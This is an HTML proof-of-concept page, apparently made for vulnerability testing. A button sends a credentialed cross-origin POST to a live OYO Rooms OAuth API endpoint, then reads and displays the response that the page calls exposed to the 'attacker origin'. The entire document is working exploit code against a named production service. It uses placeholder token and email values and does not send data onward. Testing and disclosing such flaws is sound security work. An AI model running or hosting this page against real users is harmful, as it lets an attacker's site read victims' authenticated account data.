```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OYO CORS PoC</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: #111;
            color: #eee;
            padding: 30px;
        }

        button {
            padding: 12px 20px;
            font-size: 16px;
            cursor: pointer;
        }

        pre {
            background: #000;
            padding: 20px;
            white-space: pre-wrap;
            word-break: break-word;
            border-radius: 8px;
            margin-top: 20px;
        }

        .ok {
            color: #00ff88;
        }

        .bad {
            color: #ff5555;
        }
    </style>
</head>

<body>

    <h1>OYO CORS PoC</h1>

    <p>
        This page tests whether the OYO endpoint accepts a cross-origin
        credentialed request and exposes the response to the attacker origin.
    </p>

    <button onclick="testCors()">
        Test CORS
    </button>

    <pre id="result">Waiting...</pre>

    <script>
        async function testCors() {

            const output = document.getElementById("result");

            output.textContent = "Sending cross-origin request...";

            try {

                const response = await fetch(
                    "https://www.oyorooms.com/api/pwa/slOauth?locale=en",
                    {
                        method: "POST",

                        credentials: "include",

                        headers: {
                            "Content-Type": "text/plain;charset=UTF-8"
                        },

                        body: JSON.stringify({
                            oauth_token: "TEST_TOKEN",
                            redirect_uri: "https://www.oyorooms.com/login/gmail/",
                            mode: "GMAIL",
                            email: "test@example.com"
                        })
                    }
                );

                const text = await response.text();

                output.innerHTML =
                    '<span class="ok">CORS SUCCESS</span>\n\n' +
                    'HTTP Status: ' + response.status + '\n\n' +
                    'Response:\n' + text;

                console.log("CORS response:", text);

            } catch (error) {

                output.innerHTML =
                    '<span class="bad">CORS BLOCKED / REQUEST FAILED</span>\n\n' +
                    error;

                console.error(error);
            }
        }
    </script>

</body>
</html>
```
